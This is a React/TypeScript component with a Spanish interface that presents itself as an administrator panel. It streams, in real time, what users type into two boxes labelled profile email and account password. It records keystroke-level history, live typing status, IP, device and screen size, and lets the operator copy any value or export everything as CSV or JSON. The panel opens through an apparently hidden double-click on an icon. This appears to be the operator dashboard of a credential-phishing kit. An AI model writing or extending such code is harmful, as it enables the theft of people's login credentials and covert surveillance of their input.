import React, { useState, useEffect, useRef } from 'react';
import { UserRecord } from '../types';
import { 
  X, 
  Search, 
  Trash2, 
  Download, 
  Copy, 
  Check, 
  Clock, 
  Smartphone, 
  Laptop, 
  Activity, 
  Users, 
  FileText, 
  RefreshCw,
  History,
  AlertTriangle
} from 'lucide-react';

interface AdminPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
  const [records, setRecords] = useState<UserRecord[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [expandedUser, setExpandedUser] = useState<string | null>(null);
  const [showClearConfirm, setShowClearConfirm] = useState<boolean>(false);

  const eventSourceRef = useRef<EventSource | null>(null);
  const fallbackPollRef = useRef<NodeJS.Timeout | null>(null);

  // Load initial data and connect to SSE stream
  useEffect(() => {
    if (!isOpen) {
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        eventSourceRef.current = null;
      }
      if (fallbackPollRef.current) {
        clearInterval(fallbackPollRef.current);
        fallbackPollRef.current = null;
      }
      return;
    }

    fetchRecords();

    // Connect SSE
    try {
      const sse = new EventSource('/api/live-stream');
      eventSourceRef.current = sse;

      sse.onopen = () => {
        setIsConnected(true);
      };

      sse.addEventListener('init', (e: MessageEvent) => {
        try {
          const data = JSON.parse(e.data);
          if (data.records) setRecords(data.records);
          setLoading(false);
        } catch (err) {
          console.error('Error parsing SSE init data:', err);
        }
      });

      sse.addEventListener('record_update', (e: MessageEvent) => {
        try {
          const updated: UserRecord = JSON.parse(e.data);
          setRecords((prev) => {
            const index = prev.findIndex((r) => r.id === updated.id);
            if (index >= 0) {
              const clone = [...prev];
              clone[index] = updated;
              return clone.sort((a, b) => b.lastUpdated - a.lastUpdated);
            } else {
              return [updated, ...prev];
            }
          });
        } catch (err) {
          console.error('Error parsing SSE record_update:', err);
        }
      });

      sse.addEventListener('record_deleted', (e: MessageEvent) => {
        try {
          const { id } = JSON.parse(e.data);
          setRecords((prev) => prev.filter((r) => r.id !== id));
        } catch (err) {
          console.error('Error parsing SSE delete:', err);
        }
      });

      sse.addEventListener('records_cleared', () => {
        setRecords([]);
      });

      sse.onerror = () => {
        setIsConnected(false);
      };
    } catch {
      setIsConnected(false);
    }

    // Fallback polling every 2.5 seconds to guarantee fresh data
    fallbackPollRef.current = setInterval(() => {
      fetchRecordsSilent();
    }, 2500);

    return () => {
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        eventSourceRef.current = null;
      }
      if (fallbackPollRef.current) {
        clearInterval(fallbackPollRef.current);
        fallbackPollRef.current = null;
      }
    };
  }, [isOpen]);

  const fetchRecords = async () => {
    try {
      setLoading(true);
      const res = await fetch('/api/records');
      const data = await res.json();
      if (data.success && data.records) {
        setRecords(data.records);
      }
    } catch (e) {
      console.error('Failed to fetch records:', e);
    } finally {
      setLoading(false);
    }
  };

  const fetchRecordsSilent = async () => {
    try {
      const res = await fetch('/api/records');
      const data = await res.json();
      if (data.success && data.records) {
        setRecords(data.records);
      }
    } catch {
      // Ignore background poll errors
    }
  };

  const handleDeleteRecord = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      await fetch(`/api/records/${id}`, { method: 'DELETE' });
      setRecords((prev) => prev.filter((r) => r.id !== id));
    } catch (err) {
      console.error('Error deleting record:', err);
    }
  };

  const handleClearAll = async () => {
    try {
      await fetch('/api/records', { method: 'DELETE' });
      setRecords([]);
      setShowClearConfirm(false);
    } catch (err) {
      console.error('Error clearing records:', err);
    }
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  const exportJSON = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(records, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `perfiles_guardados_${new Date().toISOString().slice(0, 10)}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  const exportCSV = () => {
    const headers = ['ID', 'Casilla 1', 'Casilla 2', 'Ultima Actualizacion', 'IP', 'Dispositivo'];
    const rows = records.map((r) => [
      `"${r.id}"`,
      `"${(r.box1 || '').replace(/"/g, '""')}"`,
      `"${(r.box2 || '').replace(/"/g, '""')}"`,
      `"${new Date(r.lastUpdated).toLocaleString('es-ES')}"`,
      `"${r.ip || ''}"`,
      `"${r.device || ''}"`,
    ]);
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((e) => e.join(','))].join('\n');
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', encodeURI(csvContent));
    downloadAnchor.setAttribute('download', `perfiles_guardados_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  const filteredRecords = records.filter((r) => {
    const q = searchQuery.toLowerCase();
    return (
      r.id.toLowerCase().includes(q) ||
      (r.box1 && r.box1.toLowerCase().includes(q)) ||
      (r.box2 && r.box2.toLowerCase().includes(q)) ||
      (r.device && r.device.toLowerCase().includes(q)) ||
      (r.ip && r.ip.toLowerCase().includes(q))
    );
  });

  const activeTypingCount = records.filter((r) => r.isTyping).length;
  const totalCharacters = records.reduce((acc, r) => acc + (r.box1?.length || 0) + (r.box2?.length || 0), 0);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-6 bg-slate-950/70 backdrop-blur-md animate-in fade-in duration-200">
      <div className="relative w-full max-w-6xl max-h-[92vh] flex flex-col bg-white rounded-2xl shadow-2xl border border-slate-200 overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-slate-200 bg-slate-50/80">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-blue-600 flex items-center justify-center text-white shadow-xs">
              <Activity className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-lg font-bold text-slate-900">
                  Panel de Administrador
                </h2>
                <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-100 text-emerald-800">
                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping" />
                  Tiempo Real
                </span>
              </div>
              <p className="text-xs text-slate-500">
                Monitoreo en vivo de todos los textos ingresados en las casillas por los usuarios
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={fetchRecords}
              className="p-2 text-slate-500 hover:text-slate-800 hover:bg-slate-200/60 rounded-lg transition-colors"
              title="Refrescar datos"
            >
              <RefreshCw className="w-4 h-4" />
            </button>
            <button
              onClick={onClose}
              className="p-2 text-slate-400 hover:text-slate-700 hover:bg-slate-200/60 rounded-lg transition-colors"
              aria-label="Cerrar panel"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Metrics Row */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 p-4 bg-slate-100/60 border-b border-slate-200 text-xs">
          <div className="bg-white p-3 rounded-xl border border-slate-200 shadow-xs flex items-center gap-3">
            <div className="p-2 bg-blue-50 text-blue-600 rounded-lg">
              <Users className="w-4 h-4" />
            </div>
            <div>
              <p className="text-slate-500 font-medium">Usuarios Registrados</p>
              <p className="text-lg font-bold text-slate-900">{records.length}</p>
            </div>
          </div>

          <div className="bg-white p-3 rounded-xl border border-slate-200 shadow-xs flex items-center gap-3">
            <div className="p-2 bg-emerald-50 text-emerald-600 rounded-lg">
              <Activity className="w-4 h-4" />
            </div>
            <div>
              <p className="text-slate-500 font-medium">Escribiendo Ahora</p>
              <p className="text-lg font-bold text-emerald-600">{activeTypingCount}</p>
            </div>
          </div>

          <div className="bg-white p-3 rounded-xl border border-slate-200 shadow-xs flex items-center gap-3">
            <div className="p-2 bg-purple-50 text-purple-600 rounded-lg">
              <FileText className="w-4 h-4" />
            </div>
            <div>
              <p className="text-slate-500 font-medium">Total Caracteres</p>
              <p className="text-lg font-bold text-slate-900">{totalCharacters}</p>
            </div>
          </div>

          <div className="bg-white p-3 rounded-xl border border-slate-200 shadow-xs flex items-center gap-3">
            <div className="p-2 bg-amber-50 text-amber-600 rounded-lg">
              <Clock className="w-4 h-4" />
            </div>
            <div>
              <p className="text-slate-500 font-medium">Estado Conexión</p>
              <p className="text-xs font-semibold text-slate-800">
                {isConnected ? 'SSE Conectado' : 'Sincronizado'}
              </p>
            </div>
          </div>
        </div>

        {/* Toolbar: Search & Action Buttons */}
        <div className="p-4 border-b border-slate-200 flex flex-col sm:flex-row gap-3 items-center justify-between bg-white">
          <div className="relative w-full sm:w-80">
            <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Buscar por texto, ID, IP o dispositivo..."
              className="w-full pl-9 pr-4 py-1.5 text-xs rounded-lg border border-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-slate-50"
            />
          </div>

          <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
            <button
              onClick={exportCSV}
              disabled={records.length === 0}
              className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-700 bg-white border border-slate-300 rounded-lg hover:bg-slate-50 disabled:opacity-50 transition-colors"
            >
              <Download className="w-3.5 h-3.5" />
              CSV
            </button>
            <button
              onClick={exportJSON}
              disabled={records.length === 0}
              className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-700 bg-white border border-slate-300 rounded-lg hover:bg-slate-50 disabled:opacity-50 transition-colors"
            >
              <Download className="w-3.5 h-3.5" />
              JSON
            </button>
            <button
              onClick={() => setShowClearConfirm(true)}
              disabled={records.length === 0}
              className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-red-600 bg-red-50 border border-red-200 rounded-lg hover:bg-red-100 disabled:opacity-50 transition-colors"
            >
              <Trash2 className="w-3.5 h-3.5" />
              Limpiar Todo
            </button>
          </div>
        </div>

        {/* Clear Confirmation Prompt */}
        {showClearConfirm && (
          <div className="bg-red-50 p-3 border-b border-red-200 flex items-center justify-between text-xs text-red-800">
            <div className="flex items-center gap-2">
              <AlertTriangle className="w-4 h-4 text-red-600" />
              <span>¿Está seguro de que desea eliminar todos los registros almacenados? Esta acción no se puede deshacer.</span>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={handleClearAll}
                className="px-2.5 py-1 bg-red-600 text-white font-medium rounded hover:bg-red-700"
              >
                Sí, eliminar todo
              </button>
              <button
                onClick={() => setShowClearConfirm(false)}
                className="px-2.5 py-1 bg-white border border-slate-300 text-slate-700 font-medium rounded hover:bg-slate-50"
              >
                Cancelar
              </button>
            </div>
          </div>
        )}

        {/* Records Content Area */}
        <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-4">
          {loading ? (
            <div className="py-16 text-center text-slate-400">
              <RefreshCw className="w-8 h-8 mx-auto animate-spin mb-3 text-blue-500" />
              <p className="text-sm">Cargando información almacenada en tiempo real...</p>
            </div>
          ) : filteredRecords.length === 0 ? (
            <div className="py-16 text-center text-slate-400 border-2 border-dashed border-slate-200 rounded-2xl">
              <FileText className="w-12 h-12 mx-auto mb-2 text-slate-300" />
              <p className="text-base font-semibold text-slate-700">No hay registros almacenados aún</p>
              <p className="text-xs text-slate-500 max-w-sm mx-auto mt-1">
                Escribe texto en las dos casillas de la aplicación para ver cómo se guarda y actualiza automáticamente aquí en tiempo real.
              </p>
            </div>
          ) : (
            filteredRecords.map((record) => {
              const isExpanded = expandedUser === record.id;
              const hasText = (record.box1 && record.box1.trim().length > 0) || (record.box2 && record.box2.trim().length > 0);

              return (
                <div
                  key={record.id}
                  className={`bg-white rounded-xl border transition-all ${
                    record.isTyping
                      ? 'border-emerald-500 ring-2 ring-emerald-500/20 shadow-md'
                      : 'border-slate-200 hover:border-slate-300 shadow-xs'
                  }`}
                >
                  {/* Card Header */}
                  <div className="p-4 bg-slate-50/70 border-b border-slate-200/80 rounded-t-xl flex flex-wrap items-center justify-between gap-3">
                    <div className="flex items-center gap-2.5">
                      <span
                        className={`w-2.5 h-2.5 rounded-full ${
                          record.isTyping
                            ? 'bg-emerald-500 animate-ping'
                            : hasText
                            ? 'bg-blue-500'
                            : 'bg-slate-300'
                        }`}
                        title={record.isTyping ? 'Escribiendo en vivo...' : 'Inactivo'}
                      />
                      <span className="font-mono text-xs font-bold text-slate-800">
                        {record.id}
                      </span>
                      {record.isTyping && (
                        <span className="px-2 py-0.5 rounded-md bg-emerald-100 text-emerald-800 text-[10px] font-semibold animate-pulse">
                          Escribiendo en {record.lastActiveField || 'casilla'}...
                        </span>
                      )}
                    </div>

                    <div className="flex items-center gap-3 text-xs text-slate-500">
                      <span className="flex items-center gap-1">
                        {record.device?.toLowerCase().includes('mac') || record.device?.toLowerCase().includes('win') ? (
                          <Laptop className="w-3.5 h-3.5" />
                        ) : (
                          <Smartphone className="w-3.5 h-3.5" />
                        )}
                        {record.device || 'Navegador Web'}
                      </span>
                      <span>•</span>
                      <span title={new Date(record.lastUpdated).toLocaleString('es-ES')}>
                        {new Date(record.lastUpdated).toLocaleTimeString('es-ES', {
                          hour: '2-digit',
                          minute: '2-digit',
                          second: '2-digit',
                        })}
                      </span>

                      <button
                        onClick={(e) => handleDeleteRecord(record.id, e)}
                        className="p-1 hover:text-red-600 hover:bg-red-50 rounded transition-colors"
                        title="Eliminar este registro"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>

                  {/* Card Body: Casilla 1 & Casilla 2 display */}
                  <div className="p-4 grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Casilla 1 View */}
                    <div className="bg-slate-50 rounded-lg p-3 border border-slate-200">
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="text-xs font-bold uppercase tracking-wider text-slate-700">
                          Casilla 1 (correo de perfil)
                        </span>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-slate-500">
                            {record.box1 ? `${record.box1.length} chars` : 'Vacía'}
                          </span>
                          {record.box1 && (
                            <button
                              onClick={() => copyToClipboard(record.box1, `${record.id}-box1`)}
                              className="text-slate-400 hover:text-slate-700 transition-colors"
                              title="Copiar texto de Casilla 1"
                            >
                              {copiedId === `${record.id}-box1` ? (
                                <Check className="w-3.5 h-3.5 text-emerald-600" />
                              ) : (
                                <Copy className="w-3.5 h-3.5" />
                              )}
                            </button>
                          )}
                        </div>
                      </div>
                      <div className="text-xs text-slate-800 whitespace-pre-wrap font-sans min-h-[48px] max-h-36 overflow-y-auto">
                        {record.box1 ? (
                          record.box1
                        ) : (
                          <span className="italic text-slate-400">(Sin contenido aún)</span>
                        )}
                      </div>
                    </div>

                    {/* Casilla 2 View */}
                    <div className="bg-slate-50 rounded-lg p-3 border border-slate-200">
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="text-xs font-bold uppercase tracking-wider text-slate-700">
                          Casilla 2 (Contraseña de cuenta)
                        </span>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-slate-500">
                            {record.box2 ? `${record.box2.length} chars` : 'Vacía'}
                          </span>
                          {record.box2 && (
                            <button
                              onClick={() => copyToClipboard(record.box2, `${record.id}-box2`)}
                              className="text-slate-400 hover:text-slate-700 transition-colors"
                              title="Copiar texto de Casilla 2"
                            >
                              {copiedId === `${record.id}-box2` ? (
                                <Check className="w-3.5 h-3.5 text-emerald-600" />
                              ) : (
                                <Copy className="w-3.5 h-3.5" />
                              )}
                            </button>
                          )}
                        </div>
                      </div>
                      <div className="text-xs text-slate-800 whitespace-pre-wrap font-sans min-h-[48px] max-h-36 overflow-y-auto">
                        {record.box2 ? (
                          record.box2
                        ) : (
                          <span className="italic text-slate-400">(Sin contenido aún)</span>
                        )}
                      </div>
                    </div>
                  </div>

                  {/* History Toggle Bar */}
                  {record.history && record.history.length > 1 && (
                    <div className="px-4 py-2 border-t border-slate-100 bg-slate-50/40 rounded-b-xl flex items-center justify-between text-xs text-slate-500">
                      <button
                        onClick={() => setExpandedUser(isExpanded ? null : record.id)}
                        className="flex items-center gap-1.5 font-medium text-blue-600 hover:text-blue-800 transition-colors"
                      >
                        <History className="w-3.5 h-3.5" />
                        <span>
                          {isExpanded
                            ? 'Ocultar historial de escritura'
                            : `Ver historial de revisiones (${record.history.length})`}
                        </span>
                      </button>
                      <span className="text-[11px] text-slate-400">
                        IP: {record.ip || 'Local'} • Pantalla: {record.screen || 'N/A'}
                      </span>
                    </div>
                  )}

                  {/* Expanded Revision History */}
                  {isExpanded && record.history && (
                    <div className="p-4 border-t border-slate-200 bg-slate-100/50 space-y-2 max-h-48 overflow-y-auto text-xs">
                      <p className="font-semibold text-slate-700 text-[11px] uppercase tracking-wide">
                        Línea de tiempo de cambios grabados:
                      </p>
                      {record.history.map((h, idx) => (
                        <div
                          key={idx}
                          className="bg-white p-2.5 rounded-lg border border-slate-200 flex items-start justify-between gap-4"
                        >
                          <div className="space-y-1">
                            <div>
                              <span className="font-bold text-slate-600">C1: </span>
                              <span className="font-mono text-slate-800">{h.box1 || '<vacío>'}</span>
                            </div>
                            <div>
                              <span className="font-bold text-slate-600">C2: </span>
                              <span className="font-mono text-slate-800">{h.box2 || '<vacío>'}</span>
                            </div>
                          </div>
                          <span className="text-[10px] text-slate-400 shrink-0 font-mono">
                            {new Date(h.timestamp).toLocaleTimeString('es-ES')}
                          </span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              );
            })
          )}
        </div>

        {/* Footer */}
        <div className="px-6 py-3 border-t border-slate-200 bg-slate-50 flex items-center justify-between text-xs text-slate-500">
          <div>
            <span>Acceso rápido: </span>
            <kbd className="px-1.5 py-0.5 bg-slate-200 rounded text-slate-700 font-mono text-[10px]">
              Doble Clic
            </kbd>
            <span> en el icono inferior izquierdo</span>
          </div>
          <button
            onClick={onClose}
            className="px-4 py-1.5 bg-slate-800 text-white font-medium rounded-lg hover:bg-slate-900 transition-colors"
          >
            Cerrar Panel
          </button>
        </div>
      </div>
    </div>
  );
};
